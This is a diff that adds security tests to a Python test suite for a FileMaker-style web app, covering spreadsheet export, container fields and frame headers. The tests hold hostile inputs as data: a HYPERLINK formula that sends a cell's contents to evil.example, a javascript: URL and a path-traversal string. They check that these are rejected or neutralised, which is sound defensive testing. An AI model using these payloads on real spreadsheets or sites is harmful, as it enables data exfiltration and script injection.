@@ -490,6 +490,48 @@ class FileMakerHostTests(unittest.TestCase):
         p = self.c.post('/filemaker/api/xlsx/parse', data={'file': (io.BytesIO(r.data), 'x.xlsx')}, content_type='multipart/form-data').get_json()
         self.assertEqual(p['sheets'][0]['rows'], [['Name', 'Amount', 'When'], ['a', '1.5', '2026-01-02']])
 
+    def test_excel_export_keeps_text_that_starts_with_equals(self):
+        import zipfile
+        rows = [['Note'], ['=HYPERLINK("https://evil.example/?d="&A2,"Open")'], ['=== heading ===']]
+        r = self.c.post('/filemaker/api/xlsx/build', json={'filename': 'x', 'header': True, 'rows': rows, 'types': ['text']})
+        sheet = zipfile.ZipFile(io.BytesIO(r.data)).read('xl/worksheets/sheet1.xml').decode()
+        self.assertNotIn('<f>', sheet, 'no cell is written as a formula')
+        p = self.c.post('/filemaker/api/xlsx/parse', data={'file': (io.BytesIO(r.data), 'x.xlsx')}, content_type='multipart/form-data').get_json()
+        self.assertEqual(p['sheets'][0]['rows'], rows)
+
+    def test_container_fields_hold_only_inserted_files(self):
+        fid = self.container_file('Forged')
+        tok = self.open(fid).get_json()['token']
+        url = f'/filemaker/api/files/{fid}/records'
+        for bad in ({'url': 'javascript:alert(1)//', 'mime': 'application/pdf'}, {'c': '../../../../../logout', 'mime': 'image/png'},
+                    {'c': 0}, {'c': True}, {'name': 'x.png'}):
+            r = self.call('POST', url, tok, {'ops': [{'op': 'create', 'table': 'T1', 'data': {'F2': 'x', 'F6': bad}}]})
+            self.assertEqual(r.status_code, 400, bad)
+        # an object is refused in a field that is not a container
+        r = self.call('POST', url, tok, {'ops': [{'op': 'create', 'table': 'T1', 'data': {'F2': {'c': 1}}}]})
+        self.assertEqual(r.status_code, 400)
+        # text (from an import or Set Field) is kept, and shown as text
+        r = self.call('POST', url, tok, {'ops': [{'op': 'create', 'table': 'T1', 'data': {'F2': 't', 'F6': 'photo.png'}}]})
+        self.assertEqual(r.get_json()['results'][0]['record']['d']['F6'], 'photo.png')
+        # a real upload is stored as {c, name, mime, size}, extra keys dropped
+        v = self.upload(fid, tok, b'%PDF-1.4 x').get_json()['value']
+        r = self.call('POST', url, tok, {'ops': [{'op': 'create', 'table': 'T1', 'data': {'F2': 'ok', 'F6': dict(v, url='javascript:x')}}]})
+        self.assertEqual(r.status_code, 200, r.get_data(as_text=True))
+        self.assertEqual(set(r.get_json()['results'][0]['record']['d']['F6']), {'c', 'name', 'mime', 'size'})
+
+    def test_pdf_containers_may_be_framed_by_the_filemaker_page_only(self):
+        fid = self.container_file('PdfFrame')
+        tok = self.open(fid).get_json()['token']
+        v = self.c.post(f'/filemaker/api/files/{fid}/containers', data={'file': (io.BytesIO(b'%PDF-1.4 x'), 'a.pdf', 'application/pdf')},
+                        headers={'X-FM-Session': tok}, content_type='multipart/form-data').get_json()['value']
+        self.call('POST', f'/filemaker/api/files/{fid}/records', tok, {'ops': [{'op': 'create', 'table': 'T1', 'data': {'F2': 'p', 'F6': v}}]})
+        got = self.c.get(f'/filemaker/api/files/{fid}/containers/{v["c"]}')
+        self.assertEqual(got.status_code, 200)
+        self.assertEqual(got.headers['X-Frame-Options'], 'SAMEORIGIN')
+        self.assertIn("frame-ancestors 'self'", got.headers['Content-Security-Policy'])
+        # every other page keeps refusing to be framed
+        self.assertEqual(self.c.get('/filemaker').headers['X-Frame-Options'], 'DENY')
+
     def test_fetch_refuses_private_addresses(self):
         fid = self.make_file('Fetch')
         tok = self.open(fid).get_json()['token']
